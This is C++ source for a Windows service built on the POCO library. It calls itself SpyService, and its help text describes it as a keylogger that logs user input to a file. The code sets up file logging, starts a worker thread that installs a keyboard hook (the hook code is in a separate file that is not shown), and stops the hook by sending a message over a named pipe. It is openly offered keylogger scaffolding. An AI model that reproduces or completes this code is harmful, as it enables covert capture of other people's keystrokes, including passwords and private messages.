#include "SpyService.h"
#include "WorkerThread.h"

SpyService::SpyService() : _helpRequested(false) {}

void SpyService::initialize(Application& self)
{
    std::string appPath = Poco::Path(commandPath()).parent().toString();

    loadConfiguration(appPath + "SpyService.properties"); // загрузить конфигурацию из файла или из командной строки
    ServerApplication::initialize(self);

    std::string loggerName = config().getString("application.logger.name");
    std::string logLevel = config().getString("application.logger.level", "debug");
    std::string logFile = config().getString("application.logger.file", "mylog.log");
    std::string rotationLog = config().getString("application.logger.rotation");
    std::string patternLog = config().getString("application.logger.pattern");

    /*
    * Создание логера приложения
    */
    AutoPtr<FileChannel> pChannel(new FileChannel);
    pChannel->setProperty("path", appPath + logFile);
    pChannel->setProperty("rotation", rotationLog);
    pChannel->setProperty("archive", "timestamp");
    Poco::AutoPtr<Poco::PatternFormatter> pPatern(new Poco::PatternFormatter);
    pPatern->setProperty("pattern", patternLog);
    Poco::AutoPtr<Poco::FormattingChannel> pAppLoggerFormatterChannel(new Poco::FormattingChannel(pPatern, pChannel));
    Logger::get("AppLogger").setChannel(pAppLoggerFormatterChannel);
    Logger::get("AppLogger").setLevel(logLevel);

}

void SpyService::uninitialize()
{
    ServerApplication::uninitialize();
}

void SpyService::defineOptions(OptionSet& options)
{
    ServerApplication::defineOptions(options);

    options.addOption(
        Option("help", "h", "display help information on command line arguments")
        .required(false)
        .repeatable(false));
}

void SpyService::handleOption(const std::string& name, const std::string& value)
{
    ServerApplication::handleOption(name, value);

    if (name == "help")
        _helpRequested = true;
}

void SpyService::displayHelp()
{
    HelpFormatter helpFormatter(options());
    helpFormatter.setCommand(commandName());
    helpFormatter.setUsage("OPTIONS");
    helpFormatter.setHeader("A keylogger Windows service that logs user input to a file.");
    helpFormatter.format(std::cout);
}

void SpyService::installKeyboardHookProcess() {
    Poco::Util::Application* app = &Poco::Util::Application::instance();
    WorkerThread runnable(app);
    Poco::Thread thread;
    thread.start(runnable);
    logger().get("AppLogger").information("Message from main thread");
    thread.join();
    //thread.detach();

}

void SpyService::removelKeyboardHookProcess() {
    // Создаем дескриптор канала
    HANDLE hPipe;
    // Имя канала
    LPCWSTR pipeName = L"\\\\.\\pipe\\MyNamedPipe";
    // Буфер для записи сообщения
    const char* message = "stop";

    // Подключаемся к серверу
    while (1)
    {
        hPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hPipe != INVALID_HANDLE_VALUE)
        {
            break;
        }
        if (GetLastError() != ERROR_PIPE_BUSY)
        {
            std::cerr << "Could not open pipe. Error: " << GetLastError() << std::endl;
            return;
        }
        // Если все каналы заняты, ждем, пока будет свободен хотя бы один
        if (!WaitNamedPipe(pipeName, 5000))
        {
            std::cerr << "Could not open pipe. Error: " << GetLastError() << std::endl;
            return;
        }
    }

    // Отправляем данные в канал
    DWORD bytesWritten;
    if (!WriteFile(hPipe, message, strlen(message) + 1, &bytesWritten, NULL))
    {
        std::cerr << "Could not write to pipe. Error: " << GetLastError() << std::endl;
        CloseHandle(hPipe);
        return;
    }

    std::cout << "Message sent to server: " << message << std::endl;

    // Закрываем дескриптор канала
    CloseHandle(hPipe);

    //HANDLE hPipe = CreateFile(L"\\\\.\\pipe\\MyNamedPipe", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    //if (hPipe == INVALID_HANDLE_VALUE) {
    //    std::cerr << "Failed to open named pipe with error " << GetLastError() << std::endl;
    //    return;
    //}

    //// Отправка данных на сервер
    //const char* sendData = "stop";
    //DWORD cbWritten;
    //if (!WriteFile(hPipe, sendData, strlen(sendData) + 1, &cbWritten, NULL)) {
    //    std::cerr << "Failed to write to named pipe with error " << GetLastError() << std::endl;
    //    CloseHandle(hPipe);
    //    return;
    //}

    //// Чтение ответа от сервера
    //const int BUFFER_SIZE = 1024;
    //char buffer[BUFFER_SIZE];
    //DWORD cbRead;
    //if (!ReadFile(hPipe, buffer, BUFFER_SIZE, &cbRead, NULL)) {
    //    std::cerr << "Failed to read from named pipe with error " << GetLastError() << std::endl;
    //    CloseHandle(hPipe);
    //    return;
    //}

    //// Закрытие канала
    //CloseHandle(hPipe);

}

int SpyService::main(const std::vector<std::string>& args)
{
    if (_helpRequested)
    {
        displayHelp();
        return Application::EXIT_OK;
    }
    //std::this_thread::sleep_for(std::chrono::seconds(20));
    //Установка хука клавиатуры
    installKeyboardHookProcess();

    waitForTerminationRequest();

    removelKeyboardHookProcess();

    return Application::EXIT_OK;
}

POCO_SERVER_MAIN(SpyService)